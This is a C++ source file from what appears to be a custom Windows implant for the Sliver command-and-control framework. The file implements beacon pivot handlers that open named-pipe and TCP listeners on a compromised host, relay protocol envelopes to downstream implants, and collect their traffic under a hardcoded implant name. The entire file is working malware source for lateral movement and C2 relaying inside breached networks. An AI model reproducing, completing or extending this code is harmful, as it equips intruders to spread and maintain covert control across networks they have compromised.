#include <windows.h>
#include "Handlers.h"
#include "Handlers_Utils.h"
#include "constants.h"
#include "listeners.h"
#include <string>
#include "pivots.h"
//#include <concurrent_unordered_map.h>
#include "Connection.h"
#define BUFSIZE 512
using namespace std;

namespace handlers {

	/*map<int, pivotHandler> pivotHandlers = {
		{sliverpb::MsgPivotStartListenerReq,static_cast<pivotHandler>(pivotStartListenerHandler)},
		{sliverpb::MsgPivotPeerEnvelope,static_cast<pivotHandler>(pivotPeerEnvelopeHandler)}
	};*/

	map<int, beaconPivotHandler> beaconPivotHandlers = {
		{sliverpb::MsgPivotStartListenerReq,static_cast<beaconPivotHandler>(beaconPivotStartListenerHandler)},
		{sliverpb::MsgPivotStopListenerReq,static_cast<beaconPivotHandler>(beaconPivotStopListenerHandler)},
		{sliverpb::MsgPivotListenersReq,static_cast<beaconPivotHandler>(beaconListenersHandler)},
		{sliverpb::MsgPivotPeerEnvelope,static_cast<beaconPivotHandler>(beaconPivotPeerEnvelopeHandler)}
	};

	mutex pivotListenersMut;
	map<int,shared_ptr<pivots::PivotListener>> pivotListeners;
	atomic<int> maxid_listener = 1;
	/*map<int, pivotHandler>& getPivotHandlers() {
		return pivotHandlers;
	}*/

	map<int, beaconPivotHandler>& getBeaconPivotHandlers() {
		return beaconPivotHandlers;
	}

	//sliverpb::Envelope pivotStartListenerHandler(sliverpb::Envelope env, shared_ptr<Connection> c) {
	//	sliverpb::PivotListener resp;
	//	string pipe_name;
	//	unique_ptr<pivots::Listener> listener = make_unique<pivots::NamedPipeListener>(pipe_name);
	//	auto piv_listener = make_shared<pivots::PivotListener>(1, listener, pipe_name, c->to_send_queue);
	//	piv_listener->StartListening();
	//	//StartListener(piv_listener);
	//	pivotListeners.insert(std::pair<int, shared_ptr<pivots::PivotListener>>(piv_listener->id, piv_listener));
	//	resp.set_bindaddress("aaaaa");
	//	resp.set_id(1);
	//	resp.set_type(sliverpb::NamedPipe);
	//	return wrapResponse(env.id(), resp);
	//}

	//sliverpb::Envelope pivotPeerEnvelopeHandler(sliverpb::Envelope env, shared_ptr<Connection> c) {
	//	sliverpb::PivotPeerEnvelope req;
	//	req.ParseFromString(env.data());
	//	auto nextPeerID = pivots::findNextPeerID(req);
	//	if (nextPeerID == 0) {
	//		cout << "not found next peer id" << endl;
	//	}
	//	for (auto it = pivotListeners.begin();it != pivotListeners.end();++it) {
	//		if (it->second->connections.count(nextPeerID)) {
	//			it->second->connections.find(nextPeerID)->second->downstream->push(std::move(env));
	//		}
	//	}
	//	sliverpb::Envelope ret;
	//	return ret;
	//}
	sliverpb::Envelope beaconListenersHandler(sliverpb::Envelope env, shared_ptr<Beacon> b) {
		sliverpb::PivotListeners resp;
		for (auto it = pivotListeners.begin();it != pivotListeners.end();++it) {
			auto l = resp.add_listeners();
			l->set_bindaddress(it->second->bindAddress);
			l->set_id(it->second->id);
			l->set_type(it->second->type);
			std::unique_lock lk{ it->second->connections_mutex };
			std::vector<uint64_t> to_remove;
			
			for (auto pivots_it = it->second->connections.begin();pivots_it != it->second->connections.end();) {
				if (pivots_it->second->stop == true) {
					it->second->connections.erase(pivots_it++);
				}
				else {
					++pivots_it;
				}
			}
			for (auto pivots_it = it->second->connections.begin();pivots_it != it->second->connections.end();++pivots_it) {
				auto p = l->add_pivots();
				p->set_peerid(pivots_it->second->downstreamPeerID);
				p->set_remoteaddress(it->second->bindAddress);
			}
		}
		return wrapResponse(env.id(), resp);
	}

	sliverpb::Envelope beaconPivotStopListenerHandler(sliverpb::Envelope env, shared_ptr<Beacon> b) {
		sliverpb::PivotStopListenerReq req;
		sliverpb::PivotListener pivln;
		req.ParseFromString(env.data());
		unique_lock lk{ pivotListenersMut };
		auto listener = pivotListeners.find(req.id());
		if (listener != pivotListeners.end()) {
			pivln.set_bindaddress(listener->second->bindAddress);
			pivln.set_id(listener->second->id);
			listener->second->StopListening();
			pivotListeners.erase(req.id());
		}
		return wrapResponse(env.id(), pivln);
	}
	sliverpb::Envelope beaconPivotStartListenerHandler(sliverpb::Envelope env, shared_ptr<Beacon> b) {
		sliverpb::PivotStartListenerReq req;
		req.ParseFromString(env.data());
		sliverpb::PivotListener resp;
		unique_ptr<pivots::Listener> listener = nullptr;
		shared_ptr<pivots::PivotListener> piv_listener = nullptr;
		if (req.type() == sliverpb::PivotType::NamedPipe) {
			listener = make_unique<pivots::NamedPipeListener>(std::format("\\\\.\\pipe\\{}", req.bindaddress()));
			piv_listener = make_shared<pivots::PivotListener>(maxid_listener, req.type(), listener, std::format("\\\\.\\pipe\\{}", req.bindaddress()), b);
		}
		else if (req.type() == sliverpb::PivotType::TCP) {
			listener = make_unique<pivots::TCPListener>(req.bindaddress());
			piv_listener = make_shared<pivots::PivotListener>(maxid_listener, req.type(), listener,  req.bindaddress(), b);
		}
		piv_listener->StartListening(b);
		//StartListener(piv_listener);
		unique_lock lk{ pivotListenersMut };
		pivotListeners.insert(std::pair<int, shared_ptr<pivots::PivotListener>>(piv_listener->id, piv_listener));
		maxid_listener++;
		resp.set_bindaddress(req.bindaddress());
		resp.set_id(piv_listener->id);
		resp.set_type(req.type());
		return wrapResponse(env.id(), resp);
	}

	sliverpb::Envelope beaconPivotPeerEnvelopeHandler(sliverpb::Envelope env, shared_ptr<Beacon> b) {
		sliverpb::PivotPeerEnvelope req;
		req.ParseFromString(env.data());
		auto nextPeerID = pivots::findNextPeerID(req);
		if (nextPeerID == 0) {
#ifdef DEBUG
			cout << "not found next peer id" << endl;
#endif
		}
		for (auto it = pivotListeners.begin();it != pivotListeners.end();++it) {
			if (it->second->connections.count(nextPeerID)) {
				while (!it->second->connections.find(nextPeerID)->second->WriteEnvelope(env)) {
				}
			}
		}
		sliverpb::Envelope ret;
		return ret;
	}

	vector<sliverpb::Envelope> collectPivotEnvelopes() {
		vector<sliverpb::Envelope> vec;
		for (auto it = pivotListeners.begin();it != pivotListeners.end();++it) {
			for (auto it_2 = it->second->connections.begin();it_2 != it->second->connections.end();++it_2) {
				if (it_2->second->Check()) {
					auto env = it_2->second->ReadEnvelope();
					if (env.type() == sliverpb::MsgPivotPeerEnvelope) {
						sliverpb::PivotPeerEnvelope peer_env;
						peer_env.ParseFromString(env.data());
						auto peers = peer_env.peers();
						for (auto it = peers.begin();it != peers.end();++it) {
							auto a = it->peerid();
						}
						auto p = peer_env.add_peers();
						p->set_name("DAMP_BOW");
						p->set_peerid(pivots::getPeerID());
						for (auto it = peers.begin();it != peers.end();++it) {
							auto a = it->peerid();
						}
						string serialized;
						peer_env.SerializeToString(&serialized);
						env.set_data(serialized);
						vec.push_back(std::move(env));
					}
				}
			}
		}
		return vec;
	}
}